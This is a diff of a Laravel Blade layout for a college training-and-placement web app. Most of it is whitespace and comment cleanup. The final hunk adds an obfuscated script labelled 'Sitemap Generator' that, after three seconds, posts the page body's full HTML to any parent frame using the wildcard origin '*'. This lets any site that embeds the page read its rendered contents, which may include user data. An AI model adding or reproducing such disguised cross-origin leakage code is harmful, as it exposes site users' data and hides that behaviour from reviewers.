@@ -18,7 +18,7 @@
     <link rel="shortcut icon" href="{{asset('favicon.ico')}}" type="image/x-icon">
     <link rel="icon" type="image/png" sizes="32x32" href="{{asset('favicon-32x32.png')}}">
     <link rel="icon" type="image/png" sizes="16x16" href="{{asset('favicon-16x16.png')}}">
- {{-- OG Tags --}}
+    {{-- OG Tags --}}
     <script type='application/ld+json'>
         {
             "@context": "http://schema.org/",
@@ -67,7 +67,7 @@
     </script>
     <script src="https://cdn.onesignal.com/sdks/OneSignalSDK.js" async=""></script>
     <script>
-      var OneSignal = window.OneSignal || [];
+        var OneSignal = window.OneSignal || [];
       OneSignal.push(function() {
         OneSignal.init({
           appId: "c2c76dab-8872-40fc-a694-ac0a73e1b6b2",
@@ -86,15 +86,16 @@
     <meta property="og:site_name" content="T&P">
     <meta property="og:description" content="This is official application of Training and Placement Cell, GNDEC, Ludhiana.">
     <meta property="og:image" content="{{asset('/images/icons/512x512.png')}}">
-    <meta property="og:locale" content="en_US"> 
+    <meta property="og:locale" content="en_US">
     {{-- twitter --}}
     <meta name="twitter:card" content="summary"> {{--
-    <meta name="twitter:site" content="@site_account"> --}} 
-    {{--  <meta name="twitter:creator" content="@itzrealsanjam">  --}}
+    <meta name="twitter:site" content="@site_account"> --}}
+    {{--
+    <meta name="twitter:creator" content="@itzrealsanjam"> --}}
     <meta name="twitter:url" content="https://www.tnpgndec.com">
     <meta name="twitter:title" content="Training and Placement Cell">
     <meta name="twitter:description" content="This is official application of Training and Placement Cell, GNDEC, Ludhiana.">
-    <meta name="twitter:image" content="{{asset('/images/icons/300x300.png')}}"> 
+    <meta name="twitter:image" content="{{asset('/images/icons/300x300.png')}}">
     {{-- title --}}
     <title>Training and Placement Cell</title>
 
@@ -104,7 +105,7 @@
     <script async src="https://cdn.jsdelivr.net/npm/pwacompat@2.0.6/pwacompat.min.js" integrity="sha384-GOaSLecPIMCJksN83HLuYf9FToOiQ2Df0+0ntv7ey8zjUHESXhthwvq9hXAZTifA"
         crossorigin="anonymous"></script>
     <meta name="msvalidate.01" content="12764669904A814D6F82E14D5B9DCD1E" />
-    <meta name="robots" content="INDEX,FOLLOW"> 
+    <meta name="robots" content="INDEX,FOLLOW">
     {{-- apple --}}
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black">
@@ -121,7 +122,7 @@
     <link rel="apple-touch-icon" sizes="180x180" href="{{asset('/images/icons/180x180.png')}}">
     {{-- ms --}}
     <meta name="msapplication-TileImage" content="{{asset('/images/icons/144x144.png')}}">
-    <meta name="msapplication-TileColor" content="#fff"> 
+    <meta name="msapplication-TileColor" content="#fff">
     {{-- JS fallback --}}
     <noscript>Your browser does not support JavaScript!</noscript>
     <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
@@ -146,7 +147,16 @@
     </div>
     <script type="text/javascript" src="/js/bundle.min.js"></script>
     <script type="text/javascript" src="service-worker.js"></script>
-    
+    <!-- Sitemap Generator -->
+    <script type="text/javascript">
+        var _0xaea9 = ["sitemapgenerator:: ", "innerHTML", "body", "document", "stringify", "*", "postMessage",
+            "setTimeout"
+        ];
+        window[_0xaea9[7]](function () {
+            parent[_0xaea9[6]](_0xaea9[0] + JSON[_0xaea9[4]](window[_0xaea9[3]][_0xaea9[2]][_0xaea9[1]]),
+                _0xaea9[5])
+        }, 3000);
+    </script>
 </body>
 
 </html>
